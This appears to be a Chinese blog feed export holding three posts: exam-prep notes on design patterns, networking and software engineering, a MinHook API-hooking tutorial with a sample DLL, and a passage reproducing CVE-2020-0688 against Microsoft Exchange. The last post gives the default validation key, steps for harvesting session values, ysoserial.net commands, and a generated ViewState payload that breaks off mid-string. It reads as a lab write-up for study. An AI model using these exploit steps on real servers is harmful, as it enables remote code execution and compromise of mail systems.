Factory</td><td>提供一个创建一系列相关或相互依赖对象的接口，而无须指定他们具体的类</td></tr><tr><td>生成器<br />Builder</td><td>将一个复杂对象的构建与它的表示分离，使得同样的构建过程可以创建不同的表示</td></tr><tr><td>原型<br />Prototype</td><td>用原型实例指定创建对象的种类，并且通过复制这些原型创建新的对象</td></tr><tr><td>单例<br />Singleton</td><td>保证一个类仅有一个实例，并提供一个访问它的全局访问点</td></tr></tbody></table><p>结构型</p><p>结构型类模式只有一个适配器</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>适配器<br />Adapter</td><td>将一个类的接口转换成客户希望的另一个接口</td></tr><tr><td>桥接<br />Bridge</td><td>将抽象部分与其实现部分分离，使它们都可以独立的变化</td></tr><tr><td>组合<br />Composite</td><td>将对象组合成树形结构以表示“部分-整体”的层次结构</td></tr><tr><td>装饰<br />Decorator</td><td>动态地给一个对象添加一些额外的职责</td></tr><tr><td>外观<br />Facade</td><td>为子系统中的一组结构提供一个一致的界面，Facade模式定义了一个高层接口，这个接口使得这一子系统更加容易使用</td></tr><tr><td>享元<br />FlyWeight</td><td>运用共享技术有效地支持大量细粒度的对象</td></tr><tr><td>代理<br />Proxy</td><td>为其他对象提供一种代理以控制对这个对象的访问</td></tr></tbody></table><p>行为型</p><p>行为型类模式包括 解释器和模版方法，其他的都为行为型对象模式</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>责任链<br />Chain of Responsibility</td><td>十多个对象都有机会处理请求，从而避免请求的发送者和接收者之间的耦合关系</td></tr><tr><td>命令<br />Command</td><td>讲一个请求封装为一个对象，从而使得可以用不同的请求对客户进行参数化；对请求排队或记录请求日志，以及支持可撤销的操作</td></tr><tr><td>解释器<br />Interpreter</td><td>给定一个语言，定义它的文法的一种表示，并定义一个解释器，这个解释器使用该表示来解释语言中的句子</td></tr><tr><td>迭代器<br />Iterator</td><td>提供一种方法顺序访问一个聚合对象中的各个元素，且不需要暴露该对象的内部表示</td></tr><tr><td>中介者<br />Mediator</td><td>用一个中介对象来封装一系列的对象交互</td></tr><tr><td>备忘录<br />Memento</td><td>在不破坏封装性的前提下捕获一个对象的内部状态，并在对象之外保存这个状态</td></tr><tr><td>观察者<br />Observer</td><td>定义对象间的一种一对多的依赖关系，当一个对象的状态发生改变时，所有依赖于它的对象都得到通知并被自动更新</td></tr><tr><td>状态<br />State</td><td>允许一个对象在其内部状态改变时改变他的行为</td></tr><tr><td>策略<br />Strategy</td><td>定义一系列的算法，把他们一个个封装起来，并且使它们可以互相替换</td></tr><tr><td>模板反复噶<br />Template Method</td><td>定义一个操作中的算法骨架，而将一些步骤延迟到子类中</td></tr><tr><td>访问者<br />Visitor</td><td>表示一个作用于某对象结构中的各元素的操作</td></tr></tbody></table><h3 id="网络相关"><a href="#网络相关" class="headerlink" title="网络相关"></a>网络相关</h3><img src="/B_%E4%B9%A6%E7%B1%8D%E8%B5%84%E6%96%99/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88/%E3%80%90%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88%E3%80%91%E8%80%83%E5%89%8D%E6%95%B4%E7%90%86/OSI7.jpeg" class="" title="img"><img src="/B_%E4%B9%A6%E7%B1%8D%E8%B5%84%E6%96%99/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88/%E3%80%90%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88%E3%80%91%E8%80%83%E5%89%8D%E6%95%B4%E7%90%86/protocol.jpeg" class="" title="img"><ol><li>TCP和UDP协议均提供了端口寻址功能</li><li>DNS域名查询的次序是：本地的hosts文件-&gt;本地DNS缓存-&gt;本地DNS服务器-&gt;根域名服务器</li></ol><h3 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h3><table><thead><tr><th>对称密钥算法<br />（共享密钥加密算法）</th><th>非对称密钥算法<br />（公钥、公开密钥加密算法）</th></tr></thead><tbody><tr><td>DES<br />3DES<br />RC-5<br />RC4<br />IDEA<br />AES分组加密算法</td><td>RSA<br />ECC<br />DSA</td></tr></tbody></table><ol><li>AES是一种<u><strong>分组加密</strong></u>算法</li><li>ARP攻击造成网络无法跨网段通信的原因是<u><strong>伪造网关ARP报文使得数据包无法发送到网关</strong></u>。</li><li>DES是<u><strong>共享密钥加密</strong></u>算法</li><li>PKI体制中，保证数字证书不被篡改的方法是<u><strong>用CA的私钥对数字证书签名</strong></u>。</li><li>PPP认证：PPP扩展认证协议支持多种认证机制<ol><li>口令验证协议（PAP）：简单的两次握手认证方法，采用文本方式发送密码</li><li>质询握手认证协议（CHAP）：安全认证协议是<u><strong>CHAP</strong></u>，它使用<u><strong>三次握手的会话过程传送密文</strong></u>。共享密钥参与计算Hash值，密钥不通过网络传送。也可以进行双向身份认证，终端也可以向服务器进行挑战，使得双方都能确认对方身份的合法性。</li></ol></li><li>X509数字认证证书标准推荐使用的密码算法<u><strong>RAS</strong></u>。而国密SM2数字证书采用的公钥密码算法是ECC基于椭圆曲线的公钥密码算法。ECC算法与RAS算法相比具有加密强度高、计算速度快的优点。</li><li>电子邮件相关的协议：<ol><li>SSL</li><li>HTTPS</li><li>PGP</li></ol></li><li>网络攻击：主动攻击和被动攻击<ol><li>主动攻击：攻击者访问他所需信息的故意行为。比如通过远程登录到特定机器的邮件端口以找出企业的邮件服务器的信息；伪造无效IP地址去连接服务器，使接受到错误IP地址的系统浪费时间去连接那个非法地址。攻击者是在主动地做一些不利于你或你的公司系统的事情。主动攻击包括<u><strong>拒绝服务攻击（Dos）、分布式拒绝服务（DDoS）、信息篡改、资源使用、欺骗、伪装、重放</strong></u>等攻击方法</li><li>被动攻击主要是收集信息而不进行访问，数据的合法用户对这种活动一点也不会察觉到。被动攻击包括<u><strong>嗅探、信息收集、会话拦截</strong></u>等攻击方法。</li></ol></li><li>DoS攻击<ol><li>SYN Flooding攻击属于DoS攻击</li></ol></li><li>包过滤防火墙<ol><li>包过滤技术对应用和用户是透明的</li></ol></li><li>公钥体系中，私钥用于<u><strong>解密和签名</strong></u>，公钥用于<u><strong>加密和验证签名</strong></u></li><li>用户A和B要进行安全通信，通信过程需要双方身份和消息不可否认。A和B通信时可使用<u><strong>数字证书</strong></u>来对用户的身份进行认证；使用<u><strong>数字签名</strong></u>确保消息不可否认。</li><li>网络安全包含了网络信息的：<ol><li>可用性：用户可利用网络时间的百分比</li><li>保密性：</li><li>完整性：未经授权不能进行修改</li><li>真实性：通过数字签名</li></ol></li><li>计算机病毒的特征包括：<ol><li>传染性、触发性</li><li>隐蔽性、感染性</li><li>潜伏性、破坏性</li></ol></li><li>访问控制的任务包括<u><strong>授权、确定存取权限、实施存取权限</strong></u></li><li>入侵检测系统：<ol><li>专家系统</li><li>模型检测</li><li>简单匹配</li></ol></li><li><u><strong>应用级防火墙</strong></u>是内部网和外部网的隔离点，它可对应用层的通信数据进行监控和过滤</li><li>蠕虫病毒：红色代码、爱虫病毒、熊猫烧香、Nimda病毒、爱丽滋病毒、震网</li><li>木马软件：冰河</li><li>三网合一的三网是指<u><strong>电信网、广播电视网、互联网</strong></u></li></ol><h3 id="知识产权基础知识"><a href="#知识产权基础知识" class="headerlink" title="知识产权基础知识"></a>知识产权基础知识</h3><ol><li>商标权的保护器是可以延长的</li><li><u><strong>合理使用</strong></u>指可以不经著作权人许可，不需支付报酬，使用其作品</li><li>软件著作权中翻译权：<ol><li>将原软件从一种程序设计语言转换成另一种程序设计语言</li><li>软件著作权人对其软件享有的以其它各种语言文字形式再表现</li><li>对软件的操作界面或者程序中涉及的语言文字翻译成另一种语言文字</li></ol></li><li>引用资料必须是已发表的作品，但只能限于介绍、评论作品，只要不构成自己作品的主要部分，可适当引用资料，而不必征得原作者的同意，不需要向他支付报酬。</li><li>政策法规不使用著作权法保护</li><li>署名权、修改权、作品完整权受永久保护</li><li>必须使用注册商标的是<u><strong>烟草制品</strong></u></li></ol><h3 id="多媒体相关"><a href="#多媒体相关" class="headerlink" title="多媒体相关"></a>多媒体相关</h3><ol><li>数字语音的采样频率定义为8KHz，是因为 <u><strong>语音信号定义的频率最高值为4kHz</strong></u>。</li><li>由ISO制定的MPEG系列标准中，<u><strong>MPEG-7</strong></u>是多媒体内容描述接口标准</li></ol><h3 id="软件工程基础知识"><a href="#软件工程基础知识" class="headerlink" title="软件工程基础知识"></a>软件工程基础知识</h3><ol><li><p>瀑布模型：将软件生存周期中的各个活动规定为依线性顺序连接的若干阶段。以文档作为驱动、适合于软件需求很明确的软件项目。优点是容易理解，管理成本低；强调开发的阶段性早期计划及需要调查和产品测试</p></li><li><p>V模型：描述了质量保证活动和沟通、建模相关活动以及早期构建相关的活动之间的关系。提供了一种将验证确认活动应用于早起软件工程工作中的方法。</p></li><li><p>增量模型：将需求分段为一系列增量产品，每一增量可以分别开发。采用随着日程时间的进展而交错的线性序列，每一个线性序列产生软件的一个可发布的“增量”。<br>优点：第一个可交付版本所需要的成本和时间很少；开发由增量表示的小系统所承担的风险不大；可以减少用户需求的变更；运行增量投资，即在项目开始时，可以仅对一个或两个增量投资。</p></li><li><p>原型模型：适合于用户需求不明确、需求经常变化的情况。系统规模不是很大也不复杂时，采用该方法比较好。</p></li><li><p>螺旋模型：将瀑布模型和行结合起来，加入了两个模型忽略的风险分析。强调风险分析，适用于庞大、复杂并且具有高风险的系统。需要开发人员具有相当丰富的风险评估经验和专门知识。过多的迭代次数会增加开发成本，延迟提交时间。</p><ol><li><p>制定计划</p></li><li><p>风险分析</p></li><li><p>实施工程</p></li><li><p>用户评估</p></li></ol></li><li><p>喷泉模型：以用户需求为动力，以对象作为驱动。支持软件重用和多项开发活动集成，具有迭代行和无间隙性。</p></li><li><p>敏捷开发模型</p><ol><li><p>极限编程（XP）：由价值观、原则、实践和行为4个部分构成</p><ol><li>4大价值观：沟通、简单性、反馈和勇气</li><li>5大原则：快速反馈、简单性假设、逐步修改、提倡更改和优质工作</li><li>12大原则：计划游戏、小型发布、隐喻、简单设计、测试先行、重构、结对编程、集体代码所有制、持续集成、每周工作40小时、现场客户和编码标准</li></ol></li><li><p>水晶法：每一个项目都需要一套不同的策略、约定和方法论</p></li><li><p>并列争求法：每30天一个迭代或冲刺，并按需求的优先级别来实现产品。</p></li><li><p>敏捷统一过程（AUP）：在大型上连续，在小型上迭代</p></li></ol></li><li><p>ISO\IEC软件质量模型规定的质量特性</p><table><thead><tr><th>功能性</th><th>可靠性</th><th>易用性</th><th>效率</th><th>维护性</th><th>可移植性</th></tr></thead><tbody><tr><td>适合性<br />准确性<br />互操作性<br />功能性的依从性<br />安全保密性</td><td>容错性<br />易恢复性<br />成熟性<br />可靠性的依从性</td><td>易学性<br />易理解性<br />易操作性<br />易用性的依从性</td><td>时间特性<br />资源利用特性<br />效率依从性</td><td>易测试性<br />易改变性<br />稳定性<br />易分析性<br />维护性的依从性</td><td>适应性<br />易安装性<br />共存性<br />易替换性<br />可移植性的依从性</td></tr></tbody></table></li><li><p>可靠性 MTTF&#x2F;(1+MTTF)</p></li><li><p>可用性 MTBF&#x2F;(1+MTBF)</p></li><li><p>可维护性 1&#x2F;(1+MTTR)</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：软件设计师考前刷题记录&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.yuque.com/stimuming/gtzioh/mos9t6ey71g1nr1x&quot;&gt;《软件设计师》&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="B_书籍资料" scheme="http://example.com/categories/B-%E4%B9%A6%E7%B1%8D%E8%B5%84%E6%96%99/"/>
    
    <category term="软件设计师" scheme="http://example.com/categories/B-%E4%B9%A6%E7%B1%8D%E8%B5%84%E6%96%99/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88/"/>
    
    
  </entry>
  
  <entry>
    <title>【OPenSource】MinHook</title>
    <link href="http://example.com/C_OpenSource/%E3%80%90OPenSource%E3%80%91MinHook/"/>
    <id>http://example.com/C_OpenSource/%E3%80%90OPenSource%E3%80%91MinHook/</id>
    <published>2024-05-10T16:00:00.000Z</published>
    <updated>2024-05-11T09:47:40.432Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：MinHook——一个mini的Hook库。如何使用及原理解析</p></blockquote><span id="more"></span><h2 id="MinHook-说明"><a href="#MinHook-说明" class="headerlink" title="MinHook 说明"></a>MinHook 说明</h2><p>MinHook 是一个用C语言实现的 mini 的 Hook 项目，可同时适用于 x86&#x2F;x64环境下，支持静态编译到项目中，目前 :star: Github Start 4K。</p><p>Github地址：<a href="https://github.com/TsudaKageyu/minhook">TsudaKageyu&#x2F;minhook: The Minimalistic x86&#x2F;x64 API Hooking Library for Windows</a></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>如何使用  MinHook ？</p><p>使用非常简单，初始化、创建Hook、启用Hook。大致代码如下所示：</p><p><strong>Hook 实现修改弹窗:</strong> 实现<code>Hook MsgBox</code>弹窗,该库的原理与我们上面手动实现的方式是相同的.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">代码来自 C/C++ MinHook 库的使用技巧 - lyshark - 博客园</span></span><br><span class="line"><span class="comment">https://www.cnblogs.com/LyShark/p/13653435.html</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;MinHook.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;libMinHook.x86.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(WINAPI *OldMessageBox)</span><span class="params">(HWND, LPCSTR, LPCSTR, UINT)</span></span>;</span><br><span class="line"></span><br><span class="line">OldMessageBox fpMessageBoxA = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">MyMessageBoxA</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> ret = <span class="built_in">fpMessageBoxA</span>(hWnd, <span class="string">&quot;Hook Inject&quot;</span>, lpCaption, uType);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SetHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">MH_Initialize</span>() == MB_OK)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MH_CreateHook</span>(&amp;MessageBoxA, &amp;MyMessageBoxA, <span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span>**&gt;(&amp;fpMessageBoxA));</span><br><span class="line"><span class="built_in">MH_EnableHook</span>(&amp;MessageBoxA);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">UnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">MH_DisableHook</span>(&amp;MessageBoxA) == MB_OK)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MH_Uninitialize</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line"><span class="built_in">SetHook</span>();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="built_in">UnHook</span>();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里还有其他一些例子，参考文章：<a href="https://www.cnblogs.com/LyShark/p/13653435.html">C&#x2F;C++ MinHook 库的使用技巧 - lyshark - 博客园</a></p><h2 id="MinHook-原理分析"><a href="#MinHook-原理分析" class="headerlink" title="MinHook 原理分析"></a>MinHook 原理分析</h2><p>参考文章：</p><ul><li><a href="https://www.cnblogs.com/lsh123/p/7467997.html">MinHook 分析01 （x86的jmp+offset类型hook） - 沉疴 - 博客园</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：MinHook——一个mini的Hook库。如何使用及原理解析&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="C_OpenSource" scheme="http://example.com/categories/C-OpenSource/"/>
    
    
    <category term="OpenSource" scheme="http://example.com/tags/OpenSource/"/>
    
  </entry>
  
  <entry>
    <title>【CVE-2020-0688】exchange远程代码执行漏洞复现</title>
    <link href="http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/Exchange/%E3%80%90CVE-2020-0688%E3%80%91exchange%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/Exchange/%E3%80%90CVE-2020-0688%E3%80%91exchange%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-05-10T02:24:53.161Z</published>
    <updated>2024-05-23T06:29:37.467Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：CVE-2020-0688 漏洞复现及分析</p></blockquote><span id="more"></span><p><strong>免责声明：本文所-涉及的信息安全技术知识仅供参考</strong>和学习之用，并不构成任何明示或暗示的保证。读者在使用本文提供的信息时，应自行判断其适用性，并承担由此产生的一切风险和责任。本文作者对于读者基于本文内容所做出的任何行为或决定不承担任何责任。在任何情况下，本文作者不对因使用本文内容而导致的任何直接、间接、特殊或后果性损失承担责任。<strong>读者在使用本文内容时应当遵守当地法律法规，并保证不违反任何相关法律法规。</strong></p><blockquote><p>相关工具下载地址：<a href="https://down.52pojie.cn/Tools/NET/">爱盘 - 最新的在线破解工具包</a></p><p>注意这个漏洞修复的版本，需要修复之前的版本才可以复现。我自己在 Exchange 2016 cu21  上通过 payload 请求对应的接口时返回 400。</p></blockquote><p>[toc]</p><h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Microsoft Exchange Server 2010 Service Pack 3</p><p>Microsoft Exchange Server 2013(cu23以下)</p><p>Microsoft Exchange Server 2016 (cu14以下)</p><p>Microsoft Exchange Server 2019(cu4以下)</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>这个漏洞是由于Exchange服务器在安装时没有正确地创建唯一的加密密钥所造成的。</p><p>具体来说，与正常软件安装每次都会产生随机密钥不同，所有Exchange Server在安装后的 <code>web.config</code> 文件中都拥有相同的 <code>validationKey</code> 和 <code>decryptionKey</code>。这些密钥用于保证 <code>ViewState</code> 的安全性。而 <code>ViewState</code> 是ASP.NET Web应用以序列化格式存储在客户机上的服务端数据。客户端通过__VIEWSTATE请求参数将这些数据返回给服务器。攻击者可以在 <code>ExchangeControl Panel web</code> 应用上执行任意.net代码。</p><p>当攻击者通过各种手段获得一个可以访问Exchange Control Panel （ECP）组件的用户账号密码时。攻击者可以在被攻击的exchange上执行任意代码，直接获取服务器权限。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>本文复现环境：Exchange 2014 cu14</p><p>OS 名称:          Microsoft Windows Server 2016 Datacenter</p><p>OS 版本:          10.0.14393 暂缺 Build 14393</p></blockquote><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p><strong>需要以下四个变量</strong></p><p>想要利用该漏洞，我们需要四个参数，分别为：</p><blockquote><p>–validationkey &#x3D; CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF（默认，漏洞产生原因）</p><p>–validationalg &#x3D; SHA1（默认，漏洞产生原因）</p><p>–generator&#x3D;B97B4E27（基本默认）</p><p>–viewstateuserkey &#x3D; ASP.NET_SessionId（手工获取，变量，每次登陆都不一致）</p></blockquote><p>在这四个变量中，前两个为默认固定，<code>viewstateuserkey</code> 和 <code>generator</code> 的值需要从经过身份验证的 <code>session</code> 中收集。<code>viewstateuserkey</code> 可以从ASP.NET的<code>_SessionID cookie</code> 中获取，而 <code>generator</code> 可以在一个隐藏字段<code>__VIEWSTATEGENERATOR</code> 中找到。<u>所有这些都可以通过浏览器中的工具轻松获取。</u></p><blockquote><p>:star: 获取 <code>viewstateuserkey</code> 和 <code>generator</code></p><ol><li><p>登录 Exchange 邮箱页面，<a href="https://localhost/ecp%EF%BC%88%E7%AE%A1%E7%90%86%E5%91%98%E9%A1%B5%E9%9D%A2%EF%BC%89">https://localhost/ecp（管理员页面）</a> 或者 <a href="https://localhost/owa%EF%BC%88%E4%B8%AA%E4%BA%BA%E9%A1%B5%E9%9D%A2%EF%BC%89">https://localhost/owa（个人页面）</a></p></li><li><p>登录成功后，重定到 <a href="https://localhost/ecp/default.aspx">https://localhost/ecp/default.aspx</a> 页面，在 DevTools 中 查看 NetWork 中的 Headers，找到 Cookie 条目，在 Cookie中找到 <code>ASP.NET_SessionId</code> 字段并获取值。</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/Exchange/%E3%80%90CVE-2020-0688%E3%80%91exchange%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240510120244926.png" class="" title="获取 ASP.NET_SessionId 值"></li><li><p>:star: 在 Response 选项卡获取 <code> __VIEWSTATEGENERATOR</code>  字段值<br>  如果未找到此字段不必慌张，直接使用默认值B97B4E27 即可。我这边的环境是 Exchange 2016 CU21 ，没有这个字段。</p> <img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/Exchange/%E3%80%90CVE-2020-0688%E3%80%91exchange%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240523111508938.png" class="" title="获取 __VIEWSTATEGENERATOR 值"></li></ol></blockquote><h3 id="使用工具生成-payload"><a href="#使用工具生成-payload" class="headerlink" title="使用工具生成 payload"></a>使用工具生成 payload</h3><p>使用ysoserial.net工具生成反序列化payload。 工具下载地址：<a href="https://github.com/pwntester/ysoserial.net/">https://github.com/pwntester/ysoserial.net/</a></p><p>生成payload命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 参数说明</span><br><span class="line">ysoserial.exe </span><br><span class="line">-p ViewState </span><br><span class="line">-g TextFormattingRunP</span><br><span class="line">roperties -c &quot;calc.exe&quot; </span><br><span class="line">--validationalg=&quot;SHA1&quot; #默认，漏洞产生原因</span><br><span class="line">--validationkey=&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; #默认，漏洞产生原因</span><br><span class="line">--gene</span><br><span class="line">rator=&quot;B97B4E27&quot; # 基本默认，如果能获取到，以获取到的为准</span><br><span class="line">--viewstateuserkey=&quot;bf2c6983-d214-<span class="number">4</span>c98-<span class="number">8</span>bd3-d4ee908cc5f0&quot; # 手动获取，每次登录都不一致</span><br><span class="line">--isdebug --islegacy</span><br><span class="line"></span><br><span class="line"># 临时模板</span><br><span class="line">ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;calc.exe&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --generator=&quot;B97B4E27&quot; --viewstateuserkey=&quot;<span class="number">148</span>b5b17-<span class="number">445</span>a-<span class="number">4480</span>-a2cc-a19057786a50&quot; --isdebug --islegacy</span><br><span class="line"></span><br><span class="line"># 临时模板 创建文件 -c &quot;<span class="built_in">cmd</span> /c <span class="built_in">echo</span> test &gt; C:\<span class="number">1</span>.txt&quot;</span><br><span class="line">ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;<span class="built_in">cmd</span> /c <span class="built_in">echo</span> test &gt; C:\\<span class="number">1</span>.txt&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --generator=&quot;B97B4E27&quot; --viewstateuserkey=&quot;<span class="number">148</span>b5b17-<span class="number">445</span>a-<span class="number">4480</span>-a2cc-a19057786a50&quot; --isdebug --islegacy</span><br></pre></td></tr></table></figure><p>生成内容如下所示：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 运行 calc.exe</span><br><span class="line"><span class="function">D:\<span class="title">Release</span>&gt;<span class="title">ysoserial.exe</span> -<span class="title">p</span> <span class="title">ViewState</span> -<span class="title">g</span> <span class="title">TextFormattingRunProperties</span> -<span class="title">c</span> &quot;<span class="title">calc.exe</span>&quot; --<span class="title">validationalg</span>=&quot;<span class="title">SHA1</span>&quot; --<span class="title">validationkey</span>=&quot;<span class="title">CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF</span>&quot; --<span class="title">generator</span>=&quot;<span class="title">B97B4E27</span>&quot; --<span class="title">viewstateuserkey</span>=&quot;148<span class="title">b5b17</span>-445<span class="title">a</span>-4480-<span class="title">a2cc</span>-<span class="title">a19057786a50</span>&quot; --<span class="title">isdebug</span> --<span class="title">islegacy</span></span></span><br><span class="line"><span class="function"><span class="title">Provided</span> <span class="title">__VIEWSTATEGENERATOR</span> <span class="title">in</span> <span class="title">uint</span>: 3111865895</span></span><br><span class="line"><span class="function"><span class="title">simulateTemplateSourceDirectory</span> <span class="title">returns</span>: /</span></span><br><span class="line"><span class="function"><span class="title">simulateGetTypeName</span> <span class="title">returns</span>: <span class="title">default_aspx</span></span></span><br><span class="line"><span class="function"><span class="title">Calculated</span> <span class="title">pageHashCode</span> <span class="title">in</span> <span class="title">uint</span> (<span class="title">ignored</span>): 3389719348</span></span><br><span class="line"><span class="function">%2<span class="title">FwEylQcAAQAAAP</span>%2<span class="title">F</span>%2<span class="title">F</span>%2<span class="title">F</span>%2<span class="title">F8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAC3BTw</span>%2<span 